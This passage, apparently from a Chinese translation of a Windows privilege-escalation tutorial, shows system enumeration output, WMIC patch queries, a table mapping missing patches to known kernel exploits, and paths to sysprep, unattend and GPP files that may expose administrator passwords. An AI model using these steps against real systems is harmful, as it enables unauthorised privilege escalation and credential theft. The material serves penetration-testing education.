class="line">Idle Time:                            Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes</div><div class="line">Power Management:                     No Start On Batteries</div><div class="line">Run As User:                          SYSTEM</div><div class="line">Delete Task If Not Rescheduled:       Enabled</div><div class="line">Stop Task If Runs X Hours and X Mins: 72:00:00</div><div class="line">Schedule:                             Scheduling data is not available in this format.</div><div class="line">Schedule Type:                        Daily</div><div class="line">Start Time:                           5:11:13 AM</div><div class="line">Start Date:                           1/1/2000</div><div class="line">End Date:                             1/1/2100</div><div class="line">Days:                                 Every 1 day(s)</div><div class="line">Months:                               N/A</div><div class="line">Repeat: Every:                        Disabled</div><div class="line">Repeat: Until: Time:                  Disabled</div><div class="line">Repeat: Until: Duration:              Disabled</div><div class="line">Repeat: Stop If Still Running:        Disabled</div><div class="line">[..Snip..]</div><div class="line"></div><div class="line"># The following command links running processes to started services.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; tasklist /SVC</div><div class="line"></div><div class="line">Image Name                     PID Services</div><div class="line">========================= ======== ============================================</div><div class="line">System Idle Process              0 N/A</div><div class="line">System                           4 N/A</div><div class="line">smss.exe                       244 N/A</div><div class="line">csrss.exe                      332 N/A</div><div class="line">csrss.exe                      372 N/A</div><div class="line">wininit.exe                    380 N/A</div><div class="line">winlogon.exe                   428 N/A</div><div class="line">services.exe                   476 N/A</div><div class="line">lsass.exe                      484 SamSs</div><div class="line">lsm.exe                        496 N/A</div><div class="line">svchost.exe                    588 DcomLaunch, PlugPlay, Power</div><div class="line">svchost.exe                    668 RpcEptMapper, RpcSs</div><div class="line">svchost.exe                    760 Audiosrv, Dhcp, eventlog,</div><div class="line">                                   HomeGroupProvider, lmhosts, wscsvc</div><div class="line">svchost.exe                    800 AudioEndpointBuilder, CscService, Netman,</div><div class="line">                                   SysMain, TrkWks, UxSms, WdiSystemHost,</div><div class="line">                                   wudfsvc</div><div class="line">svchost.exe                    836 AeLookupSvc, BITS, gpsvc, iphlpsvc,</div><div class="line">                                   LanmanServer, MMCSS, ProfSvc, Schedule,</div><div class="line">                                   seclogon, SENS, ShellHWDetection, Themes,</div><div class="line">                                   Winmgmt, wuauserv</div><div class="line">audiodg.exe                    916 N/A</div><div class="line">svchost.exe                    992 EventSystem, fdPHost, netprofm, nsi,</div><div class="line">                                   WdiServiceHost, WinHttpAutoProxySvc</div><div class="line">svchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,</div><div class="line">                                   NlaSvc</div><div class="line">spoolsv.exe                   1244 Spooler</div><div class="line">svchost.exe                   1272 BFE, DPS, MpsSvc</div><div class="line">mDNSResponder.exe             1400 Bonjour Service</div><div class="line">taskhost.exe                  1504 N/A</div><div class="line">taskeng.exe                   1556 N/A</div><div class="line">vmtoolsd.exe                  1580 VMTools</div><div class="line">dwm.exe                       1660 N/A</div><div class="line">explorer.exe                  1668 N/A</div><div class="line">vmware-usbarbitrator.exe      1768 VMUSBArbService</div><div class="line">TPAutoConnSvc.exe             1712 TPAutoConnSvc</div><div class="line">[..Snip..]</div><div class="line"></div><div class="line">C:\Windows\system32&gt; net start</div><div class="line"></div><div class="line">These Windows services are started:</div><div class="line"></div><div class="line">   Application Experience</div><div class="line">   Application Information</div><div class="line">   Background Intelligent Transfer Service</div><div class="line">   Base Filtering Engine</div><div class="line">   Bluetooth Support Service</div><div class="line">   Bonjour Service</div><div class="line">   COM+ Event System</div><div class="line">   COM+ System Application</div><div class="line">   Cryptographic Services</div><div class="line">   DCOM Server Process Launcher</div><div class="line">   Desktop Window Manager Session Manager</div><div class="line">   DHCP Client</div><div class="line">   Diagnostic Policy Service</div><div class="line">   Diagnostic Service Host</div><div class="line">   Diagnostic System Host</div><div class="line">   Distributed Link Tracking Client</div><div class="line">   Distributed Transaction Coordinator</div><div class="line">   DNS Client</div><div class="line">   Function Discovery Provider Host</div><div class="line">   Function Discovery Resource Publication</div><div class="line">   Group Policy Client</div><div class="line">[..Snip..]</div><div class="line">   </div><div class="line"># This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes</div><div class="line">than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; DRIVERQUERY</div><div class="line"></div><div class="line">Module Name  Display Name           Driver Type   Link Date</div><div class="line">============ ====================== ============= ======================</div><div class="line">1394ohci     1394 OHCI Compliant Ho Kernel        11/20/2010 6:01:11 PM</div><div class="line">ACPI         Microsoft ACPI Driver  Kernel        11/20/2010 4:37:52 PM</div><div class="line">AcpiPmi      ACPI Power Meter Drive Kernel        11/20/2010 4:47:55 PM</div><div class="line">adp94xx      adp94xx                Kernel        12/6/2008 7:59:55 AM</div><div class="line">adpahci      adpahci                Kernel        5/2/2007 1:29:26 AM</div><div class="line">adpu320      adpu320                Kernel        2/28/2007 8:03:08 AM</div><div class="line">AFD          Ancillary Function Dri Kernel        11/20/2010 4:40:00 PM</div><div class="line">agp440       Intel AGP Bus Filter   Kernel        7/14/2009 7:25:36 AM</div><div class="line">aic78xx      aic78xx                Kernel        4/12/2006 8:20:11 AM</div><div class="line">aliide       aliide                 Kernel        7/14/2009 7:11:17 AM</div><div class="line">amdagp       AMD AGP Bus Filter Dri Kernel        7/14/2009 7:25:36 AM</div><div class="line">amdide       amdide                 Kernel        7/14/2009 7:11:19 AM</div><div class="line">AmdK8        AMD K8 Processor Drive Kernel        7/14/2009 7:11:03 AM</div><div class="line">AmdPPM       AMD Processor Driver   Kernel        7/14/2009 7:11:03 AM</div><div class="line">amdsata      amdsata                Kernel        3/19/2010 9:08:27 AM</div><div class="line">amdsbs       amdsbs                 Kernel        3/21/2009 2:35:26 AM</div><div class="line">amdxata      amdxata                Kernel        3/20/2010 12:19:01 AM</div><div class="line">AppID        AppID Driver           Kernel        11/20/2010 5:29:48 PM</div><div class="line">arc          arc                    Kernel        5/25/2007 5:31:06 AM</div><div class="line">[..Snip..]</div></pre></td></tr></table></figure>
<h2 id="Δt-for-t4-The-Arcane-Arts-Of-WMIC"><a href="#Δt-for-t4-The-Arcane-Arts-Of-WMIC" class="headerlink" title="Δt for t4 - The Arcane Arts Of WMIC"></a>Δt for t4 - The Arcane Arts Of WMIC</h2><h4 id="我想要单独提及一下WMIC-Windows-Management-Instrumentation-Command-Line-，因为它是Windows最有用的命令行工具。WMIC-对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。"><a href="#我想要单独提及一下WMIC-Windows-Management-Instrumentation-Command-Line-，因为它是Windows最有用的命令行工具。WMIC-对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。" class="headerlink" title="我想要单独提及一下WMIC (Windows Management Instrumentation Command-Line) ，因为它是Windows最有用的命令行工具。WMIC 对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。"></a>我想要单独提及一下WMIC (Windows Management Instrumentation Command-Line) ，因为它是Windows最有用的命令行工具。WMIC 对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。</h4><h4 id="下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看："><a href="#下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看：" class="headerlink" title="下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看："></a>下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看：</h4><ul>
<li>Windows WMIC Command Line (ComputerHope) - <a href="https://www.computerhope.com/wmic.htm" target="_blank" rel="external">here</a></li>
</ul>
<h4 id="令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC-的测试中我注意到任何版本的XP-系统都不允许低权限账号使用WMIC。相反，默认安装的Windows-7-Professional-和Windows-8-企业版却允许使用低权限账号使用WMIC-来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？"><a href="#令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC-的测试中我注意到任何版本的XP-系统都不允许低权限账号使用WMIC。相反，默认安装的Windows-7-Professional-和Windows-8-企业版却允许使用低权限账号使用WMIC-来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？" class="headerlink" title="令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC 的测试中我注意到任何版本的XP 系统都不允许低权限账号使用WMIC。相反，默认安装的Windows 7 Professional 和Windows 8 企业版却允许使用低权限账号使用WMIC 来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？"></a>令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC 的测试中我注意到任何版本的XP 系统都不允许低权限账号使用WMIC。相反，默认安装的Windows 7 Professional 和Windows 8 企业版却允许使用低权限账号使用WMIC 来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？</h4><h4 id="为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC-收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows-补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。"><a href="#为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC-收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows-补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。" class="headerlink" title="为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC 收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows 补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。"></a>为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC 收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows 补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。</h4><h4 id="你可以从这里下载我的脚本"><a href="#你可以从这里下载我的脚本" class="headerlink" title="你可以从这里下载我的脚本"></a>你可以从这里<a href="http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar" target="_blank" rel="external">下载我的脚本</a></h4><h4 id="你也可以从这里下载我利用脚本收集的信息样本"><a href="#你也可以从这里下载我利用脚本收集的信息样本" class="headerlink" title="你也可以从这里下载我利用脚本收集的信息样本"></a>你也可以从这里下载我利用脚本收集的<a href="http://www.fuzzysecurity.com/tutorials/files/Win7.html" target="_blank" rel="external">信息样本</a></h4><h2 id="Δt-for-t5-to-t6-Quick-Fails"><a href="#Δt-for-t5-to-t6-Quick-Fails" class="headerlink" title="Δt for t5 to t6 - Quick Fails"></a>Δt for t5 to t6 - Quick Fails</h2><h4 id="继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了"><a href="#继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了" class="headerlink" title="继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了."></a>继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了.</h4><h4 id="尽管已经通过我的WMIC-脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。"><a href="#尽管已经通过我的WMIC-脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。" class="headerlink" title="尽管已经通过我的WMIC 脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。"></a>尽管已经通过我的WMIC 脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div class="line"></div><div class="line">Caption                                     Description      HotFixID   InstalledOn</div><div class="line">http://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769034  Update           KB2769034  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013</div><div class="line">[..Snip..]</div></pre></td></tr></table></figure>
<h4 id="提权的EXP-就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些-，大家可以下载对应版本的Windows-试试这些EXP。"><a href="#提权的EXP-就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些-，大家可以下载对应版本的Windows-试试这些EXP。" class="headerlink" title="提权的EXP 就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些:，大家可以下载对应版本的Windows 试试这些EXP。"></a>提权的EXP 就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">常见的EXP有这些:</a>，大家可以下载对应版本的Windows 试试这些EXP。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">#Security Bulletin   #KB     #Description    #Operating System  </div><div class="line">MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)</div><div class="line">CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</div><div class="line">CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</div><div class="line">CVE-2018-0833   [SMBv3 Null Pointer Dereference Denial of Service]    (Windows 8.1/Server 2012 R2)</div><div class="line">MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)</div><div class="line">MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)</div><div class="line">MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)</div><div class="line">MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)</div><div class="line">MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)</div><div class="line">MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)</div><div class="line">MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)</div><div class="line">MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)</div><div class="line">MS16-014 　[K3134228]　　[remote code execution]　　(2008/Vista/7)</div><div class="line">MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012)</div><div class="line">MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012)</div><div class="line">MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)</div><div class="line">MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012)</div><div class="line">MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012)</div><div class="line">MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2)</div><div class="line">MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8)</div><div class="line">MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8)</div><div class="line">MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003)</div><div class="line">MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8)</div><div class="line">MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8)</div><div class="line">MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8)</div><div class="line">MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP)</div><div class="line">MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7)</div><div class="line">MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)</div><div class="line">MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8)</div><div class="line">MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7)</div><div class="line">MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP)</div><div class="line">MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP)</div><div class="line">MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP)</div><div class="line">MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP)</div><div class="line">MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista)</div><div class="line">MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7)</div><div class="line">MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)</div><div class="line">MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista)</div><div class="line">MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)</div><div class="line">MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP)</div><div class="line">MS10-012 　[KB971468]　　[SMB Client Trans2 stack overflow]　　(Windows 7/2008R2)</div><div class="line">MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista)</div><div class="line">MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0)</div><div class="line">MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista)</div><div class="line">MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP)</div><div class="line">MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008)</div><div class="line">MS08-066 　[KB956803]　　 [AFD.sys]　　(Windows 2000/XP/Server 2003)</div><div class="line">MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista)</div><div class="line">MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000)</div><div class="line">MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)</div><div class="line">MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)</div></pre></td></tr></table></figure>
<h4 id="下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。"><a href="#下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。" class="headerlink" title="下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。"></a>下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。</h4><h4 id="通常这些敏感文件会出现在下面目录中："><a href="#通常这些敏感文件会出现在下面目录中：" class="headerlink" title="通常这些敏感文件会出现在下面目录中："></a>通常这些敏感文件会出现在下面目录中：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">c:\sysprep.inf</div><div class="line">c:\sysprep\sysprep.xml</div><div class="line">%WINDIR%\Panther\Unattend\Unattended.xml</div><div class="line">%WINDIR%\Panther\Unattended.xml</div></pre></td></tr></table></figure>
<h4 id="这些配置文件极可能包含明文密码，也可能会出现base64-编码的情况，下面是一些配置文件的事例："><a href="#这些配置文件极可能包含明文密码，也可能会出现base64-编码的情况，下面是一些配置文件的事例：" class="headerlink" title="这些配置文件极可能包含明文密码，也可能会出现base64 编码的情况，下面是一些配置文件的事例："></a>这些配置文件极可能包含明文密码，也可能会出现base64 编码的情况，下面是一些配置文件的事例：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"># This is a sample from sysprep.inf with clear-text credentials.</div><div class="line"></div><div class="line">[GuiUnattended]</div><div class="line">OEMSkipRegional=1</div><div class="line">OemSkipWelcome=1</div><div class="line">AdminPassword=s3cr3tp4ssw0rd</div><div class="line">TimeZone=20</div><div class="line"></div><div class="line"># This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is not</div><div class="line">encryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;.</div><div class="line"></div><div class="line">&lt;LocalAccounts&gt;</div><div class="line">    &lt;LocalAccount wcm:action=&quot;add&quot;&gt;</div><div class="line">        &lt;Password&gt;</div><div class="line">            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</div><div class="line">            &lt;PlainText&gt;false&lt;/PlainText&gt;</div><div class="line">        &lt;/Password&gt;</div><div class="line">        &lt;Description&gt;Local Administrator&lt;/Description&gt;</div><div class="line">        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;</div><div class="line">        &lt;Group&gt;Administrators&lt;/Group&gt;</div><div class="line">        &lt;Name&gt;Administrator&lt;/Name&gt;</div><div class="line">    &lt;/LocalAccount&gt;</div><div class="line">&lt;/LocalAccounts&gt;</div><div class="line"></div><div class="line"># Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding.</div><div class="line"></div><div class="line">&lt;AutoLogon&gt;</div><div class="line">    &lt;Password&gt;</div><div class="line">        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</div><div class="line">        &lt;PlainText&gt;false&lt;/PlainText&gt;</div><div class="line">    &lt;/Password&gt;</div><div class="line">    &lt;Enabled&gt;true&lt;/Enabled&gt;</div><div class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</div><div class="line">&lt;/AutoLogon&gt;</div></pre></td></tr></table></figure>
<h4 id="GPO-首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL-中的Groups-xml-文件，任何经过身份认证的用户都可以读取该文件。尽管xml-文件中的密码通过使用AES-加密来保证安全性，但是通过msdn-发布的静态密钥可以很轻松的解密。"><a href="#GPO-首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL-中的Groups-xml-文件，任何经过身份认证的用户都可以读取该文件。尽管xml-文件中的密码通过使用AES-加密来保证安全性，但是通过msdn-发布的静态密钥可以很轻松的解密。" class="headerlink" title="GPO 首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL 中的Groups.xml 文件，任何经过身份认证的用户都可以读取该文件。尽管xml 文件中的密码通过使用AES 加密来保证安全性，但是通过msdn 发布的静态密钥可以很轻松的解密。"></a>GPO 首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL 中的Groups.xml 文件，任何经过身份认证的用户都可以读取该文件。尽管xml 文件中的密码通过使用AES 加密来保证安全性，但是通过msdn 发布的静态密钥可以很轻松的解密。</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv05_big.png" alt=""></p>
<h4 id="除了Groups-xml-以外，其他几个策略首选项文件也可能存在-“cPassword”-属性"><a href="#除了Groups-xml-以外，其他几个策略首选项文件也可能存在-“cPassword”-属性" class="headerlink" title="除了Groups.xml 以外，其他几个策略首选项文件也可能存在 “cPassword” 属性"></a>除了Groups.xml 以外，其他几个策略首选项文件也可能存在 “cPassword” 属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Services\Services.xml: Element-Specific Attributes</div><div class="line">ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element</div><div class="line">Printers\Printers.xml: SharedPrinter Element</div><div class="line">Drives\Drives.xml: Element-Specific Attributes</div><div class="line">DataSources\DataSources.xml: Element-Specific Attributes</div></pre></td></tr></table></figure>
<h4 id="如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。"><a href="#如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。" class="headerlink" title="如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。"></a>如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv06_big.png" alt=""></p>
<h4 id="除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。"><a href="#除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。" class="headerlink" title="除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。"></a>除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">可以利用 msf 中的一个后渗透模块来实现自动化 [post/windows/gather/credentials/gpp](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)</div></pre></td></tr></table></figure>
